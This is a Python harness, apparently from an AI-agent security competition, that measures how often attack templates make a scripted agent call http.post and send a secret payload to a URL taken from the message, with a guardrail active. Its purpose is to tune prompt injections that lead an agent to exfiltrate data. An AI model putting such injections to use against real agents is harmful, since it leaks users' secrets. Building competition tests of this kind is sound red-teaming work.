"""Offline template fire-rate probe (Phase-2 prep).

Without a real LLM, uses a scripted agent that fires only if the user message
matches a crude pattern — useful as a harness. With OPENAI_API_KEY or a local
model later, swap agent factory.
"""

from __future__ import annotations

import json
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "data"))
sys.path.insert(0, str(ROOT / "src"))

from aicomp_sdk.agents.types import (  # noqa: E402
    AGENT_STATE_VERSION,
    AgentStateSnapshot,
    FinalResponseDecision,
    ToolCall,
    ToolCallDecision,
)
from aicomp_sdk.core.env.sandbox import SandboxEnv  # noqa: E402
from aicomp_sdk.guardrails.optimal import Guardrail as Optimal  # noqa: E402

import attack as attack_mod  # noqa: E402

FIXTURES = ROOT / "data" / "aicomp_sdk" / "fixtures"
OUT = ROOT / "results" / "template_probe.json"


class PatternPostAgent:
    """Fires http.post+SECRET_MARKER if message looks like an EXFIL instruction."""

    def __init__(self) -> None:
        self.n = 0
        self.last_msg = ""

    def reset_state(self) -> None:
        self.n = 0

    def snapshot_state(self) -> AgentStateSnapshot:
        return AgentStateSnapshot(version=AGENT_STATE_VERSION, provider="p", payload={})

    def restore_state(self, snapshot: AgentStateSnapshot) -> None:
        del snapshot

    def next_action(self, *, history, tools):  # noqa: ANN001
        del tools
        self.n += 1
        text = ""
        try:
            for ev in reversed(list(getattr(history, "events", []) or [])):
                if getattr(ev, "text", None):
                    text = ev.text
                    break
        except Exception:
            pass
        self.last_msg = text
        low = text.lower()
        if self.n > 2:
            return FinalResponseDecision(text="OK")
        if "http.post" in low and "secret_marker" in low and "url=" in low:
            part = text.split("url=", 1)[1].split()[0].strip(" .,\"'")
            url = part if part.startswith("http") else "http://zz.co"
            return ToolCallDecision(
                call=ToolCall(
                    call_id=f"c{self.n}",
                    tool_name="http.post",
                    arguments={"url": url, "data": attack_mod.PAYLOAD},
                )
            )
        return FinalResponseDecision(text="I cannot help with that.")


def main() -> None:
    templates = [attack_mod.TEMPLATE, attack_mod.FRAME_TEMPLATE, *attack_mod.ALT_TEMPLATES]
    env = SandboxEnv(
        seed=1,
        fixtures_dir=FIXTURES,
        agent=PatternPostAgent(),
        guardrail=Optimal(),
    )
    rows = []
    for t_i, template in enumerate(templates):
        fires = 0
        trials = 20
        t0 = time.time()
        for i in range(trials):
            msg = attack_mod._msg(1000 * t_i + i, template)
            env.reset()
            env.interact(msg, max_tool_hops=4)
            if attack_mod._fired(env):
                fires += 1
        rows.append(
            {
                "template_index": t_i,
                "template_preview": template[:80],
                "trials": trials,
                "fires": fires,
                "rate": fires / trials,
                "seconds": time.time() - t0,
            }
        )
    OUT.write_text(json.dumps(rows, indent=2), encoding="utf-8")
    print(json.dumps(rows, indent=2))
    print("wrote", OUT)


if __name__ == "__main__":
    main()
